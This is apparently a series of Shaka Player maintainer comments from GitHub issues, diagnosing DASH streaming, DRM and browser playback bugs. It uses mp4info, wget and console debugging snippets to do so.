|\n| ... | ... | ... |\n| 14 | 98.254 | 109.400 |\nSo it seems that your manifest is inaccurate from the very beginning.  I don't think it's reasonable for the player to detect or handle this.\nWhat encoder are you using?  How did you create this particular piece of content?\n. I used mp4info from Bento4.  Here's the skeleton of what I did:\n``` sh\nDownload segments\nwget http://foo.bar/path/to/init.mp4\nwget http://foo.bar/path/to/segment_0.m4s\nCombine media segment with init segment so Bento4 can read the segment\ncat init.mp4 segment_0.m4s > s0.mp4\nShow the first 10 frames and their timestamps:\nmp4info --verbose --show-samples s0.mp4 | grep cts | head -n 10\n```\nOutput looks like this:\n[000001] size=   227 duration=  1000 (    40 ms) offset=      4134 dts=         0 (         0 ms) cts=      2000 (        80 ms) [0] [S] <I>\n[000002] size=    41 duration=  1000 (    40 ms) offset=      4361 dts=      1000 (        40 ms) cts=      6000 (       240 ms) [0]     <P>\n[000003] size=    37 duration=  1000 (    40 ms) offset=      4402 dts=      2000 (        80 ms) cts=      4000 (       160 ms) [0]     <B>\n[000004] size=    37 duration=  1000 (    40 ms) offset=      4439 dts=      3000 (       120 ms) cts=      3000 (       120 ms) [0]     <B>\n[000005] size=    37 duration=  1000 (    40 ms) offset=      4476 dts=      4000 (       160 ms) cts=      5000 (       200 ms) [0]     <B>\n[000006] size=    43 duration=  1000 (    40 ms) offset=      4513 dts=      5000 (       200 ms) cts=     10000 (       400 ms) [0]     <P>\n[000007] size=    39 duration=  1000 (    40 ms) offset=      4556 dts=      6000 (       240 ms) cts=      8000 (       320 ms) [0]     <B>\n[000008] size=    37 duration=  1000 (    40 ms) offset=      4595 dts=      7000 (       280 ms) cts=      7000 (       280 ms) [0]     <B>\n[000009] size=    37 duration=  1000 (    40 ms) offset=      4632 dts=      8000 (       320 ms) cts=      9000 (       360 ms) [0]     <B>\n[000010] size=    43 duration=  1000 (    40 ms) offset=      4669 dts=      9000 (       360 ms) cts=     14000 (       560 ms) [0]     <P>\n. Since this seems to be badly-encoded or badly-packaged content, I'm going to close this issue.  Please follow up with bitmovin for resolution and feel free to reference this conversation for the technical details.  Thanks for using Shaka!\n. The latest is v1.6.3, as seen on the appspot demo site.  However, Shaka v1.x does not support multi-Period content.\nWe have yet to release a beta of v2.0, but we have already implemented multi-Period support in the preview branch.  (See #186.)\nWhen we reach the beta stage, we will merge preview into master and release v2.0.0-beta.  This is tentatively scheduled for the end of February.  If you are signed up for our mailing list, you will see an announcement there.\nUnfortunately, the v2 work-in-progress is not complete yet, so you will have to wait for the beta.  Sorry!\n. The demo page is not complete yet.  In the mean time, you can still use the library API from the preview branch.  You can generate the API docs with ./build/docs.py, which will output to docs/api/.  Run ./build/all.py to build the library itself.  Here's a very simple demo of the most basic usage of the v2 API, complete with a short, multi-period asset:\nhtml\n<!DOCTYPE html>\n<html>\n  <head>\n    <script src=\"third_party/closure/goog/base.js\"></script>\n    <script src=\"dist/deps.js\"></script>\n    <script src=\"shaka-player.uncompiled.js\"></script>\n    <script>\nwindow.onload = function() {\n  shaka.polyfill.installAll();\n  var uri = '//storage.googleapis.com/widevine-demo-media/' +\n      'heliocentrism/heliocentrism.mpd';\n  player = new shaka.Player(video);\n  player.addEventListener('error', function(event) {\n    console.error('ERROR', event.detail);\n  });\n  player.load(uri).catch(function(error) {\n    console.error('FAILED TO LOAD', error);\n  });\n}\n    </script>\n  </head>\n  <body><video id=\"video\" controls width=\"800\" height=\"600\" autoplay></video></body>\n</html>\n. That stream is using presentationTimeOffset, but it appears we aren't handling that attribute correctly.  I just filed #297 to track this.\n. @perses, The manifest you referenced above is a live, multi-period manifest that seems to do some strange things.  In particular, there seems to be no continuity between updates.\nPeriod id=\"0\" always starts at 0s, but 6s later when refreshing the manifest, the URLs that used to be Period id=\"1\" at 8.4s are now showing in Period id=\"0\" at 0s.  The length and number of Periods fluctuates wildly, too.  From 3 periods totaling 23s to 2 periods totaling 22s.  This doesn't make much sense.  Even when we fix presentationTimeOffset, this will not be supportable.  What encoder are you using for this?\nThe expectation is that Period ids and timestamps are consistent and refer to the same content across updates.  A Period may disappear in updates, and new Periods may be added.  Control over how much content is available (the \"DVR window\") is handled with the timeShiftBufferDepth attribute.\n. Ah, I see.  Then the remaining issue is likely our lack of <Location> support.  I'll file that one, too.\n. See #298 for Location support.\n. I'm not sure if this is valid content or not, but it's common enough that I feel we should find a simple solution.\nThe behavior for this kind of thing varies between browsers.  In Chrome, for example, gaps of less than 250ms do not seem to stall the media pipeline.  I'm not aware of any standard requirements around this, though.\nIf you are willing to continue hosting that stream for a while, we will take a look in the next few weeks and see if there's a simple way to deal with it across browsers.\n. Different browsers seem to treat the first video segment differently.  The test is to append the init segment and the first video segment to a SourceBuffer and then check SourceBuffer.buffered.start(0).  Here are the results:\n| Safari 8 & 9 | Firefox 44 on Linux | Chrome 48 on Linux | IE11 & Edge13 on Win 10 |\n| --- | --- | --- | --- |\n| 83ms (CTS) | 83ms (CTS) | 0ms (DTS) | 0ms (DTS) |\nI'm not sure which is implementations are correct in this, but it causes Shaka to behave differently since we use buffered.start(0) to calculate drift.  Ideally we could be resilient in all cases, but right now I think I need to do some digging into which (if any) is to-spec with MSE.\n. The latest Shaka v2 code in master does not error on this content.  The buffered range on Safari 9 starts at 83ms, but Safari refuses to jump the gap from 0.  Using Firefox on the same Mac, I also see that the buffered range starts at 83ms, but Firefox will automatically jump the gap from 0.\nSo I'm tempted to say that Shaka is doing everything it can now, and that the rest is a Safari issue.\nDoes anyone here know the right procedure to file bugs against Safari?  Googling \"safari bug report\" doesn't turn up an obviously correct result.  The closest seems to be \"Apple - Safari - Feedback\", but that is not so much a public bug report as a comments form.  \"please note that we cannot respond to the comments you submit.\"\n\"Apple Bug Reporter\" seems more appropriate, but if you search for \"Safari\" in the bug tracker, you get zero results.  Is that the wrong place?  Or are all the bug reports private?\n. Yes, what I meant was that regardless of the outcome of w3c/media-source#54, Safari doesn't jump a tiny 83ms gap at the start like other browsers seem to do.\nFirefox is using CTS and Chrome is using DTS, but both are willing to skip tiny gaps in the buffer during playback.  (Chrome doesn't do this for the content in question here, but I have seen it skip small gaps in other content.)\n@barbibulle, I've mirror your content here for my bug report: https://storage.googleapis.com/shaka-demo-assets/_bugs/safari-non-zero-cts/stream.mpd\n@jernoble, I've filed a bug against WebKit here: https://bugs.webkit.org/show_bug.cgi?id=156316\nThanks, everyone!\n. @KbdBrucd777, your comments are unrelated to this project.  I'm not sure why you are leaving them here.\nI have locked this issue to prevent further comments and I am deleting the inappropriate comments you have left (strong language, violent threats, and the medical saga of a newborn).\n. It seems that the CDM download in Chrome is started independent of anything that happens in JavaScript.  Also, the Player can only ask whether or not the CDM is available now, not whether it will be downloaded later.\nSo until the CDM is downloaded, trying to play protected content on Chrome will fail due to Widevine not yet being available.\nSorry for the inconvenience.\n. @peyoh, can you please clarify what you mean when you say that the video \"squeezes\"?  I'm not familiar with that term in this context.\n. Could be a regression, then.  We'll look into it for v1.6.4.\n. @peyoh This should be fixed now.  Please try again with the latest from master and confirm.\n. Great!  We'll roll this out in v1.6.4.\n. The Shaka team does not have provide any VAST plugins at this time, but we would be happy to provide support to the community to create such plugins.\n. @neilRGS @peyoh Shaka support for live on IE11 starts with v2, which has not been released yet.\nIn v1, we expect that we can set video.currentTime before appending segments.  This is not true on IE11.  In v2, we no longer have this assumption.\nWe expect v2 beta to be available in a week or two.  Thanks!\n. Thanks, Neil.  We are reasonably confident that v2 will solve this for you, since v2's StreamingEngine already passes all unit and integration tests on IE11.  Now we just have to complete the rest of v2!  :-)\n. We expect a beta by the end of the month, which we will announce on the mailing list.\n. @neilRGS, can you please try with the latest from master?  We just released v2-beta.  If it still does not work for you, can you provide a link to your manifest?\n. \ud83c\udf7b \n. I am able to reproduce in both IE11 and Edge, but on a system with known-bad clock-sync.  If I hack a UTCTiming element into the manifest for clock sync, my client's clock gets adjusted by ~12 seconds and the content plays on both IE11 and Edge.  @neilRGS, can you configure Wowza to put a suitable UTCTiming element into the manifest?\n. @neilRGS, we've added two things to help with this.  One is a warning when UTCTiming is missing, and the other is a config option to specify a clock sync URI outside of the manifest.  Please let us know if this helps.\n. Looks good, but be warned: HttpVideoSource was originally used for testing purposes.  We've deprecated it and no equivalent is planned for v2.\n. Details:\nTo simplify, we will assume that any AdaptationSetSwitching elements are symmetrical.  We will not support asymmetrical AdaptationSetSwitching at this time.  For example, if AS1 points to AS2, we will presume AS2 also points to AS1 and merge them.\nIOP v3.2 gives an example wherein AVC and HEVC AdaptationSets may switch freely.  This means any filtering for type support must either be applying before merging or be applied at the Representation level after merging.  (Current implementation in Player filters at the Representation level.)\n. Since Safari 8's MSE implementation is incomplete and Safari 9's isn't, we have decided to blacklist Safari 8 in MediaSourceEngine.support().\n. Put simply, it's not supported because we've never seen it before.  :-)  I think this is something we can fit into v2, though.\n. @perses, JFYI\n. @perses JFYI\n. @johan, could you add appropriate entries to CONTRIBUTORS and AUTHORS as well?\n. Looks good, thanks!  Would you be willing to make a similar pull request in our preview branch for v2?  We have replaced the shell build scripts with python-based scripts.\n. Check out build/shakaBuildHelpers.py.  getAllFiles() is the equivalent to v1's find commands.\n. Let me investigate.  Our build bot is still fairly new, so this might be the bot's fault.\n. There was a bug in the bot's job script.  We made a mistake in the v1-v2 transition.  Should be working for both branches now.\n. @johan Thanks so much!\n. I believe this would involve two events, waitingforkey and canplay, to enter and exit the \"waiting on keys\" state, respectively.  Needs investigation to confirm.\n. We're already able to detect decode errors, but in cases where we have the wrong key IDs for the content, we currently just wait forever.  This happens sometimes during early app development due to mistakes in the player configuration or the license server.\nIf we can detect this, we can save people debugging time and effort.\n. Due to the complexity of implementation, we will not support timeShiftBufferDepth of zero.\n. @jasonwitty There is no reason any particular resolution should have anything to do with stalls.  Shaka does not have any resolution-specific logic, nor does the browser as far as I know.\nIs your content encrypted or in the clear?\n. What's the value of video.currentTime when it stalls?\n. What encoder/packager are you using?\n. Can you provide us with a URL to access your content for debugging purposes?  Either publicly or privately?\n. I modified your manifest to have no audio and only one video track.  I made two versions of this.\nIn version 1, I kept id video_eng=449984, which is 480x272.\nIn version 2, I kept id video_eng=2000000, which is 640x368.\nI used the debugger to check the key ID that I got in the license:\njs\ns = app.player_.emeManager_.sessions_[0];\ns.keyStatuses.forEach(function(status, key_id) {\n    console.log(status, shaka.util.Uint8ArrayUtils.toHex(new Uint8Array(key_id))); });\nI got the same key ID in the license for both representations, and this matches the key ID in the init segment for both representations according to Bento4's mp4info --verbose.\nI played version 1 for 60 seconds without issue.  Version 2 does not play at all.  So I think the fact that the content stalled for you at 21 seconds is a coincidence caused by adaptation in the Player.  If you play without ABR and force the selection of this track, nothing plays at all.\nWhen it fails, the video element has readyState of HAVE_METADATA, with 16 seconds of content buffered.  There are no errors from the video decoder.\nStill investigating.\n. Can you try this on a platform with hardware decode?  I'm suspicious of the video decoder in this scenario.\n. Specifically, can you try Shaka running on Chrome on some platform with hardware decode?\n. Running the same content in a different player (Silverlight or Xbox) with a different manifest (SmoothStreaming) doesn't leave any part of the system the same, so that doesn't help with diagnosis of your problem.\nCan you try leaving the player (Shaka) the same, as well as the browser (Chrome), and the manifest (DASH), but just try a different platform?  Instead of using Shaka in Chrome on Linux, Windows, or Mac, can you try Shaka in Chrome on, say, an Android phone?  Or ChromeOS?\n. @jasonwitty, we've managed to reproduce and track this down to a bug in the Chrome CDM on certain platforms.  The Chrome CDM team is investigating a fix.  I'll update this ticket when I hear back from them.  Thanks for the report!\n. Chrome 56 is now in beta.  Can you try it out and verify that this is now fixed?. Sounds like a difference in the media stacks on Firefox for Windows and Linux.  According to Mozilla's release calendar, Firefox 45 became the current stable release a few days ago.  Could you please try with Firefox 45?\n. Sorry, no, I'm not really sure.  Are you able to play other encrypted content using Shaka on the Chromecast?\n. @amirch1, since this appears to be a Chromecast bug, I'm leaning toward closing this issue with the label \"working as intended\".  Any objections?\n. @cmgrecu, thanks for your contribution!\nCould you also implement presentationTimeOffset for SegmentList and SegmentBase?  Could you add tests?\n. It looks like one says \"m4a\" and the other \"mp4\" on the file extension.  Otherwise, they do look the same.\n. The code and the tests look okay to me so far.  Thanks for putting this together!\nIf you could add the same for SegmentBase (plus tests), I think it would probably be done.  SegmentBase should behave as SegmentTimeline.  (subtract PTO from all reference times)\nI'm still looking into SegmentList to confirm whether or not it is correct to add PTO.\n. @cmgrecu, I can find no language in either the DASH spec or DASH IOP v3.2 specifically about PTO in context of SegmentList without SegmentTimeline.  It does not seem to say that there is any special interpretation of this scenario, nor does it seem to prohibit the combination.  The spec seems to say that PTO is always subtracted.\nIf you have a live SegmentList, and the earliest segments are unavailable and not listed, startNumber is used to indicate that, not PTO.\nThis leads me to believe that where you're adding PTO in shaka.dash.SegmentList.parseSegmentListInfo_, PTO should be subtracted instead.  (I also believe that it would probably not make sense for an encoder to generate an MPD with SegmentList and PTO without using SegmentTimeline.)\n@tobbee, since you've helped us with similar compliance issues in the past, can you confirm this interpretation?\n. Great, thanks for the fixes!  Just add support for SegmentBase and I'll be happy to merge.\n. Oh, and one more thing: it looks like you haven't signed the CLA yet.  Please see CONTRIBUTING.md.  Thanks!\n. @cmgrecu, code looks good so far.  Since we don't have any tests for the segment index parsers yet, don't worry about adding tests for SegmentBase.\nI'm going to give your PR a run through our buildbot.  Thanks for your contribution!\n. @faiyeah, there is no such restriction in Shaka or Widevine.  Can you please try the following?\n1. Use the latest release of Shaka Player, v1.6.4\n2. Enable debug logging (?debug in the URL of the demo app or shaka.log.setLevel(shaka.log.Level.DEBUG) in your own app in uncompiled mode)\n3. Open the JavaScript console\n4. Send us the JS logs\n. @faiyeah, we haven't heard from you in a while.  Is this still an issue for you?\n. @faiyeah, we haven't heard from you in a few weeks, so I'm going to go ahead and close this issue.  Please let me know if you are still having trouble and we can reopen and investigate.\n. Chrome 56 is now in beta.  Can you try it out and verify that this is now fixed?. Just looking at your media-internals log, it seems that this is the problem from Chrome's perspective:\n00:00:00 122    error   Incorrect CENC subsample size.\nThis message comes from Chrome's media stack:\nhttps://code.google.com/p/chromium/codesearch#chromium/src/media/formats/mp4/track_run_iterator.cc&l=610\nThis is outside of Shaka Player's control, so you'll need to file this bug against either the packager or Chrome itself.\n. The stream in question is not treated as live because even though the duration grows, it has a finite duration.\nIf streaming catches up to the current duration, we call endOfStream(), after which duration can no longer be extended.\n. @perses, if the format of this manifest is not in a stable state, I will stop work and wait for you to fix it.  May I ask what product is generating this content?\nWhile you are working on your server, please test on the latest Shaka from the master branch.  It supports multiple periods, presentationTimeOffset, and <Location>.  To temporarily work around the endOfStream issue, edit shaka.media.StreamingEngine.prototype.update_ and change this:\njs\n  // Check if we've buffered to the end of the presentation.\n  if (timeNeeded >= timeline.getDuration()) {\nto this:\njs\n  // Check if we've buffered to the end of the presentation.\n  if (timeNeeded >= timeline.getDuration() && 0) {\nOnce your server and manifest format are in a state you are happy with, please let us know and we will work to find a more permanent solution for this endOfStream issue.\n. @perses, while you are making changes, you should add an AdaptationSet id.  Without this, Shaka can't be certain that the AS from one manifest matches the other, and therefore can't merge the timelines correctly.\n. Actually, on second look, Representation IDs are unique within the Period according to the spec.  AdaptationSet IDs should not be required.  We'll fix that.\n. One more bug on our end: your presentation should not be considered to have a finite duration.  We'll fix that as well.\n. No problem.  I'll ask that #315 close #310, then.  Thanks for working with us on this.\n. Using the latest release, v1.6.4, on http://shaka-player-demo.appspot.com/, I am unable to reproduce.  I can play \"Car/CENC\", which is encrypted with Clearkey, \"Car/SegmentTemplate\", which is encrypted with Widevine, and the Widevine version of \"Sintel (4k)\".\nChrome for Android does not allow autoplay, so you must click the \"play\" button on the video controls after loading a video.  Could that be your problem?\n. Are you able to visit the demo on appspot and play the assets I mentioned?\n. If you can play other assets on Chrome on Android, it's probably not a problem only with Chrome or only with Shaka.  My early guess is that it's one of the following:\n1. a packager bug\n2. a problem with your packager options\n3. a problem with your input content\n4. an incompatibility between components (packager, content, Chrome, Player)\nIn any case, I'm happy to help you diagnose it further.\n. Sounds good.  To start, if you can provide manifest and proxy URLs that my team can access, we will try to reproduce.  Based on what we see, we will decide what the next step is.  If you can't provide URLs publicly, please send me a private email.  My email address can be found in CONTRIBUTORS.\n. Hi Peyo, when I open your site on Android in the debugger, I see this in the JS console:\n'goog.require could not find: shaka.player.DashVideoSource'\nIt seems that CLOSURE_NO_DEPS is set in the window, which breaks our library's uncompiled mode by telling Closure not to automatically load the deps file.  The culprit is http://www.gstatic.com/eureka/clank/cast_sender.js, which isn't included in the app itself, but seems to be included by Chrome on Android directly.  This JS file is not loaded on desktop.\nThis appears to be a bug that has already been filed against Chrome: http://crbug.com/597315\nThere are two ways you can work around this in the mean time:\n1. Run in compiled mode by adding ?compiled to the URL\n2. Patch in the deps file in load.js:\nloadScript('third_party/closure/goog/base.js');\n    loadScript('third_party/closure/goog/deps.js');   // ADD THIS HERE\n    loadScript('shaka-player.uncompiled.js');\nSince Shaka appears to be working correctly when not interfered with, I will close this as \"working as intended\".  Please let me know if there's anything else I can do to help.\n. Hi Brad,\nIn Shaka v1, we only supported VTT subtitles, and only if the browser supports VTT directly.  To show text in v1, we added a <track> element to the <video> and set track.src to the VTT URL.  We use the presence of VTTCue to determine if the browser supports VTT natively.\nIn Shaka v2, we parse VTT into individual cues and feed them to the browser using either VTTCue or TextTrackCue, whichever is available.  Therefore in v2, we can support any subtitle format we can parse in JavaScript, regardless of whether or not the browser supports that format natively.\nSo you should already be able to see VTT text in Shaka v2 on both IE11 and Edge.\nWe're getting very close to cutting v2 beta.  Would you be interested in giving the latest from the master branch a try?\n. I'm going to go ahead and close this as working in v2 and working-as-intended (VTTCue checks) in v1.  Please let us know if it's not working for you in v2 and we will reopen and investigate.  Thanks!\n. I'm torn on that.  On the one hand, we could skip those and keep playback going.  On the other, wouldn't you want to find and fix that bad content instead of hiding the problem?\n. Gotcha.  Well, we now support TTML, too, if that's helpful.\nI filed #501 to track this issue.  We'll try to get it fixed.\n. I'm not sure I understand the question.  Are you using a release version of Shaka (v1.x) or the latest code in the master branch?\n. Here's the normal path:\nIf you don't specify init data in the callback, cenc:pssh content is used if present.  Init data is passed to the CDM in generateRequest(), and the generated request is sent via HTTP POST to the license server URL you configured.\nThe generated request for clearkey looks like this: https://w3c.github.io/encrypted-media/#clear-key-request-format\nSo if you want the key IDs, use a license request pre-processor to parse the request:\nfunction preprocessClearKey(licenseRequestInfo) {\n  var requestBinary = licenseRequestInfo.body;\n  var requestText = String.fromCharCode.apply(null, new Uint8Array(requestBinary));\n  var request = JSON.parse(requestText);\n  var key_ids_base64 = request.kids;\n  console.log(key_ids_base64);\n}\nDoes that help?\n. Happy to help!\n. Hi @randeeppr, the method in that error message (check_output) was introduced a little over 5 years ago in Python v2.7.  I will update our docs to state that v2.7 is the minimum version required by the build scripts.  In the mean time, please update to v2.7.  Thanks!\n. @cmgrecu, it seems that Google's legal bot has flagged your latest commit because the email address doesn't match your CLA.  I am not able to override either the Google policy or the automatic check by the bot.  Can you amend that commit to change the email address of the committer?  Something like this should work:\ngit config user.email \"your_email@example.com\"\ngit config user.name \"Your Name\"\ngit commit --amend --reset-author\ngit push -f\nThanks!\n. No worries!  I'll run it through our buildbot now for one last check before we merge.  Thanks for contributing!\n. We are about to release v2.0.0-beta from the master branch, but the tutorial you're following is from v1.6.x.  You should check out the v1.6.x branch for now.  Sorry for the confusion!\n. @Pierpaolo1992, there is nothing obviously wrong with the code, but if you are loading Shaka Player v2, this will not work.  shaka.player.Player in v1 became shaka.Player in v2.\nWhen you open this page in the browser, open the JS debugger.  Type this to see what version you have loaded:\njs\nshaka.player && shaka.player.Player.version || shaka.Player.version\nThat will display the version number, both for v1 and v2 releases.. Sorry, that would be a bug on our part.  The fix is to quote the parameter: error['xhr'] = xhr;\nWe're focusing on v2 now, but if you make a pull-request against against the v1.6.x branch, I'd be happy to review it.\n. Fixed in #319 \n. Please read CONTRIBUTING.md and follow the instructions there.\n. Yeah, you're right.  The new test doesn't really help anything in this case.  We could go ahead and drop it, IMO.\n. Thanks!\n. @wader, sure I can push a new v1.6.x release with bug fixes.\nAs for 2.0, I'd rather take another approach.  You need the body of the HTTP response, correct?  What if instead of passing up XHR, we attached the response text to error.data instead?\n. v1.6.5 is up on npm now.  Thanks!\n. @wader, v2 now includes the response body in the error object.  Thanks!\n. I see two issues here:\n1. StreamingEngine calculates a 42 drift for the audio stream and subsequently makes a lookup for -42ms in the index.  This should be clamped to 0.\n2. The buffering algorithm is exact.  It sees that we've buffered no audio ahead of t=0 (since buffered audio starts at t=42ms), and never leaves the buffering state.  Browser media stacks have a gap tolerance built-in, and so should our buffering algorithm.\n. @prasadkhambete, please try again with the latest sources.  Thanks!\n. What version of Shaka are you using?  Can you provide a public link to the content?\n. There does not seem to be a good way to do this without introducing additional CORS requirements.\n. Depends on #322\n. Hi @aletorrado,\nIf you can find another JS/MSE player that plays in-sync, it could be a Shaka issue.  Have you tried in dash.js?\nIf the desync is present in both players, it could be a browser issue.  But from what I know of MSE, I find it very unlikely that this specific frame rate is incorrectly supported.  So my next suggestion is that you check that the content has been correctly encoded in the first place.\nI don't know how you are encoding your content, but it would be easy with ffmpeg, IMO, to make a mistake that produces this desync.  For example, with a 30fps input file, the position of the -r option dictates whether your are overriding the input frame rate or specifying an output framerate:\nsh\nffmpeg -i input.mp4   -r 25 frames_dropped.mp4\nffmpeg -r 25 -i input.mp4   bad_sync.mp4\nDoes this help?\n. I was able to reproduce with your test page.  It seems that the playhead is outside the buffered range:\nvideo.currentTime => 583.420756\nvideo.buffered.start(0) => 584.005079\nvideo.buffered.end(0) => 587.999999\nI found that spot by luck while manually seeking, but if I seek to exactly that spot, it happens every time:\njs\nvideo.currentTime = 583;\nIn the manifest, the timescale is 24000 and the segment duration is 95760.  95760 / 24000 = 3.99 seconds.  To seek to 583, we would calculate 583 / 3.99 = 146.115.  Since startNumber is 0, we would fetch segment 146.  To analyze this segment in Linux:\nsh\nwget https://eu-storage-bitcodin.storage.googleapis.com/bitStorage/7875_9ef90fef446ac887e6b9a16185086713/191640_7cc1d8535960fed4acf0a1f9edd51dc4/video_0_4800000/dash/init.mp4\nwget https://eu-storage-bitcodin.storage.googleapis.com/bitStorage/7875_9ef90fef446ac887e6b9a16185086713/191640_7cc1d8535960fed4acf0a1f9edd51dc4/video_0_4800000/dash/segment_146.m4s\ncat init.mp4 segment_146.m4s > segment_146.mp4\nmp4info --verbose --show-samples segment_146.mp4 | grep cts | head\nThis shows:\n[000001] size=277998 duration=  1000 (    41 ms) offset=      2010\n    dts=  14016000 (    584000 ms) cts=  14018000 (    584083 ms) [0] [S] <I>\nSo the first frame of that segment indeed starts at 584 seconds, which is what the browser reports as well.  Therefore the manifest is not an accurate description of the underlying stream.\nI would recommend you report this to whoever wrote the DASH packager you used to create this stream.  I will leave this issue open while we discuss internally what, if anything, we could do to support this kind of broken content without adding complexity to the system.\n. No problem.  Glad I could help!\n. The DASH spec permits manifests to be \"approximate\", and it appears that the definition of approximate is that the accumulated inaccuracy must be less than 50% of the ideal segment duration.\nSo we will try to be a little more flexible and tolerate being off by at most one segment.\n. Yes, there is a limit to what the browser can handle.  It varies by browser, and may vary by platform as well.  There is no API in JavaScript to query this limit, so it will always be possible for an application to set a buffering goal that is too high.\nThere is a particular exception that browsers are supposed to throw when this happens, and we have plans in v2 to catch and handle it.  (See #258.)  The eventual behavior will be to automatically reduce the buffering goal to something slightly less than what the browser has already buffered.\nUnfortunately, there are architectural problems in v1 that make this difficult, so that feature will only be available in v2.  In the mean time, you should set your buffering goal to something smaller than 4 minutes.\nIt's also worth noting that the browser's limit is generally in terms of bytes, but our buffering goal is terms of time.  You can fit many more seconds of low-bitrate content into the browser's buffer than high-bitrate content.  HD will require a lower buffering goal than SD, and UHD will require a lower goal than HD.  Embedded devices will generally be more limited than desktops.\nDoes that help?\n. In v1, Shaka does not remove old data from the buffer.  The browser's MediaSource implementation will evict old data as it sees fit to meet an internal limit that is not exposed.\nIn v2, Shaka will remove old data from buffer based on the player's configuration (streaming.bufferBehind).  It does this because in some cases and on some platforms, the automatic eviction logic in MediaSource implementations can't be relied on to keep memory usage down.  (See #247.)\n. Thanks, we'll take a look.\n. Error code 5000 was removed between v2.0.0-beta2 and v2.0.0-beta3.  Here are the docs from beta2:\nhttp://v2-0-0-beta2.shaka-player-demo.appspot.com/docs/api/shaka.util.Error.html\n5000 is INCONSISTENT_BUFFER_STATE, which no longer exists because we simplified away that possibility in 6daa7f3b.\nIf you're getting that error, you're definitely running either beta or beta2.  We've fixed a lot of bugs on the way to v2.0.0, so please upgrade when you have the chance.  Please note the small API changes introduced between beta2 and beta3, which are noted in CHANGELOG.md.\n. Should be an easy fix to just loop instead of using fromCharCode.apply.\nI'm not sure I understand your point about fromCodePoint(), though.  The values in a Uint8Array are not large enough for that to be necessary.\n. I believe this has already been done:  https://github.com/MetaCDN/videojs-shaka-player\nDoes that help?\n. @hoimingw, can you please give us some more details?  What version of Shaka are you using?  Are you using shaka-player-demo.appspot.com or running from source?\n. Can you provide us with a manifest URL to reproduce the issue?\n. My email address can be found in CONTRIBUTORS.  Please send to Joey Parrish and Timothy Drews.\n. We're currently failing to play encrypted streams on Edge where no capabilities are returned from an EME query.  We'll have to skip this check when the information isn't available.\n. Widevine currently supports persistent licenses on ChromeOS.\nThis is the bug to track Widevine persistent license support on Chrome for Android: https://bugs.chromium.org/p/chromium/issues/detail?id=493521\nThe great thing about JavaScript running on top of standard APIs is that if and when a DRM vendor supports persistent licenses on desktop through EME, a Shaka-based application will have access to that capability without any changes.\n. @chetanshelake, thanks for your interest in Shaka Player.  Your comments are unrelated to this issue.  Please file a new issue or write to our mailing list for support.\n. Closing due to inactivity.. If you are synchronizing slides to the video, you need the currently-displayed video timestamp, correct?  Not the timestamp of the segment we are currently downloading?  Our default buffering configuration is to download 30 seconds ahead of what is displayed.\nYou can trivially get the timestamp of what is being displayed using video.currentTime.  The video element also has a timeupdate event to let you know when currentTime changes.\nIs this what you're looking for?\n. Hi Neil,\nSorry to drag this out, but I just wanted to clarify a few things and make sure we understand what you need.\nBefore you asked about \"the actual timestamps in the media segments\".  video.currentTime shows the current media timestamp being displayed.  Unless we apply an offset (driven by presentationTimeOffset and/or Period.start), video.currentTime shows exactly what's in the media.\nIn your most recent comment, though, it sounds like you want the time the stream has been running.  So, for example, if the live stream begins at midnight, and it is now 1am, the time you want would be 3600s.  This is independent of the media timestamps, though, which do not have to start at t=0 when the live broadcast begins.\nIt's also not clear to me if you really want the time the stream has been running, or the time the stream had been running when the currently-displayed frame was created.  To synchronize with another stream, that would make the most sense to me.\nSo, to clarify:\n- Do you want media timestamps or the amount of time elapsed since the stream began broadcasting?\n- Do you want this time to correspond to the live edge, or to the video frame being displayed?\nAlso, what do you mean by \"track data ... read through Shaka\"?  Do you mean adding an additional track client-side that is not in the manifest?\n. Let me try to restate your problem in a different way.  Please tell me if I am getting it right or not.\nYou need to display timed images alongside the video.  You want to load the images before the corresponding video frames are being displayed so that the image can be displayed without latency.\nIs that right?\n. Then I believe I have a relatively simple suggestion.\nShaka is buffering ahead of the playhead by a configurable amount.  By default, this is 30 seconds.  It also drops old buffers behind the playhead by a configurable amount.  By default, this is also 30 seconds.\nIf you want to load your images ahead of their display, you should just do a very simple buffer-ahead type algorithm similar to what Shaka does.  You don't actually need to know the timestamps in the segment we just downloaded.\n1. Listen for timeupdate events on the video tag or set a timer to poll every few seconds or so.\n2. Let T be the value of video.currentTime when the event or timer fires.\n3. Let A be the value of player.getConfiguration().streaming.bufferingGoal.\n4. Let B be the value of player.getConfiguration().streaming.bufferBehind.\n5. If there are any images that need to be shown between times T and T + A that you haven't loaded yet, start loading them now in order.\n6. If there are images loaded that are no longer needed after time T - B, release them so that they are destroyed by the garbage collector.\n. @neilRGS Is this still an issue for you or can we close it?\n. @neilRGS, since we haven't heard from you in a while, I'm closing this issue now.  If you need further support, just let us know and we'll be happy to help.\n. Error 1002 is because of a failed XHR.  I suspect that the default retry parameters are to blame.  I would guess that this would be resolved if we set the default to at least 2 attempts.  The first request, interrupted by sleep, would fail.  The second request, initiated after wakeup, would succeed.\n@xhwang-chromium, can you please test this theory?  Open the demo app, then open the JS console.  In the console, run this:\njs\nshakaDemo.player_.configure({streaming:{retryParameters:{maxAttempts:2}}});\nshakaDemo.player_.configure({manifest:{retryParameters:{maxAttempts:2}}});\nshakaDemo.player_.configure({drm:{retryParameters:{maxAttempts:2}}});\nThen load an asset and repeat your sleep test.  Thanks!\n. Error 1002 is because of a failed XHR.  I suspect that the default retry parameters are to blame.  I would guess that this would be resolved if we set the default to at least 2 attempts.  The first request, interrupted by sleep, would fail.  The second request, initiated after wakeup, would succeed.\n@xhwang-chromium, can you please test this theory?  Open the demo app, then open the JS console.  In the console, run this:\njs\nshakaDemo.player_.configure({streaming:{retryParameters:{maxAttempts:2}}});\nshakaDemo.player_.configure({manifest:{retryParameters:{maxAttempts:2}}});\nshakaDemo.player_.configure({drm:{retryParameters:{maxAttempts:2}}});\nThen load an asset and repeat your sleep test.  Thanks!\n. What URL are you using?  Are you building and running Shaka locally or using our appspot demo?\n. What URL are you using?  Are you building and running Shaka locally or using our appspot demo?\n. I'm sorry, I think I made a mistake in the link.  I edited that comment to correct, but here it is again for convenience:  http://shaka-player-demo.appspot.com/demo/\n. Okay, thanks for sanity-checking my guess.  I'm traveling and don't have access to a Mac right now, but we'll try to make time to fix this before we release v2.0.0.  Thanks!\n. I re-tested this on the nightly build.  Here's what I did:\n1. Load nightly build on Chrome on Mac\n2. Choose \"Sintel 4k\" and start playback\n3. Wait about 30 seconds\n4. Close the laptop\n5. Wait 2 minutes\n6. Open the laptop\nPlayback continues, with audio initially playing catching up to a still video frame.  After that, video plays in sync.  (I imagine this catch-up phase has something to do with Chrome's 